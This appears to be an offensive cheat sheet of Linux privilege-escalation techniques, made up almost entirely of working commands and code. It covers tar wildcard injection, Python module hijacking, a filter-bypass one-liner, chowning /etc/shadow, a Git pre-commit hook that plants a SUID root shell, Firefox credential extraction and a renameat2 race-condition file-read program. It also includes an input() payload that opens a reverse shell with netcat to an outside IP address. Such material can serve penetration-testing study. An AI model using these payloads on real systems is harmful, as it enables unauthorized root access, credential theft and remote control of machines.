# Exploitation techniques

## Summary
- [Extract Firefox config file](#extract-firefox-config-file)
- [Tar wildcard privilege escalation](#tar-wildcard-privilege-escalation)
- [Privilege escalation with Python](#privilege-escalation-with-python) 
  - [Python module hijacking](#python-module-hijacking)
  - [Bypass restricted keyword](#bypass-restricted-keyword)
  - [Change file owner](#change-file-owner)
  - [Injecting payload into input function](#injecting-payload-into-input-function)
- [Abusing Git hooks](#abusing-git-hooks)
- [Read unauthorized files with race condition](#read-unauthorized-files-with-race-condition)

## Extract Firefox config file
```
compress firefox config file and download to local machine
python3 firefox-decrypt.py [file name]
get possible credential stored inside
```

## Tar wildcard privilege escalation
```
cat > shell.sh << EOF
#!/bin/bash
/bin/bash
EOF
chmod +x shell.sh
echo "" > "--checkpoint-action=exec.sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
```

## Privilege escalation with Python
### Python module hijacking
```
	EXAMPLE: #!/usr/bin/env python3
		 from compare import *
		 print(compare.Str('hello', 'hello', 'hello'))
echo """
			import os
			os.system("/bin/bash")
		   """ > /tmp/compare.py
export PYTHONPATH="/tmp"
```

### Bypass restricted keyword
- `__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')`

### Change file owner
- `python3 -c 'import os;os.chown("/etc/shadow",1000,1000)'`

### Injecting payload into input function
***Input the following command into python input()***
- `__import__('os').system('nc -e /bin/bash 10.4.64.135 4444')`

### Abusing Git hooks
```
any Git repo has a .git directory and one of the folders is hooks
by default it has a bunch of .sample files however hooks will skip .sample files but not the others
we can exploit this by writing a bash script with a regular name without .sample extension inside hooks directory
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
the exploit copy /bin/bash into /tmp/0xdf, change owner to root and sets it to SUID
when someone tries to commit, pre-commit file will run
```

### Read unauthorized files with race condition
```
assume there is a file that disallow unauthorized user to read it
unauthorized user can read the file with race condition exploitation
first upload this .c file into the target machine
	#define _GNU_SOURCE
			#include <stdio.h>
			#include <fcntl.h>
			#include <stdio.h>
			#include <unistd.h>
			#include <sys/syscall.h>
			#include <linux/fs.h>

			int main(int argc, char *argv[]) {
			  while (1) {
			    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
			  }
			  return 0;
			}
the code above constantly exchange names between 2 files
since the script will run constantly, we can read the file because the file cant keep up with the constant name changes and therefore raise the race condition vulnerability
compile the .c script and run it with 2 files as the arguments
gcc rename.c -o rename
./rename secret_file_to_read random_file
now while the rename script keeps running, we can try to read the secret_file_to_read
```
